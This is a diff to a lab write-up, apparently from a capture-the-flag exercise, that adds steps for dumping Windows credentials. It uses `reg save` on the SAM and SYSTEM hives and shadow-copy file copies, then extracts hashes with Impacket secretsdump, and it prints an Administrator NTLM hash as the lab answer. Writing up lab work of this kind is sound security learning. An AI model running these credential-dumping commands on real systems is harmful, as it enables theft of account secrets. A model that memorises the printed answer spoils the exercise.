@@ -99,6 +99,26 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\Users\Administrator\Desktop\system
 ```
 
+## Registry Hive Extraction
+
+Another method to dump credentials from the SAM database is by exporting registry hive files directly from the Windows Registry.
+
+On the Windows VM, used the `reg save` command with Administrator privileges to export both the `SAM` and `SYSTEM` registry hives.
+
+```cmd id="x4m8pl"
+reg save HKLM\sam C:\Users\Administrator\Desktop\sam-reg
+```
+
+```cmd id="k7v2qa"
+reg save HKLM\system C:\Users\Administrator\Desktop\system-reg
+```
+
+Successfully created the registry hive dump files:
+
+* `sam-reg`
+* `system-reg`
+
+
 ---
 
 ### Extracting NTLM Hashes
@@ -108,6 +128,8 @@ Transferred the dumped files to the AttackBox and used Impacket `secretsdump` to
 ```bash id="t1m9zy"
 impacket-secretsdump -sam sam-reg -system system-reg LOCAL
 ```
+
+The answer for the question is already shown in the instructions.
 
 **Administrator NTLM Hash:** `98d3a787a80d08385cea7fb4aa2a4261`
 
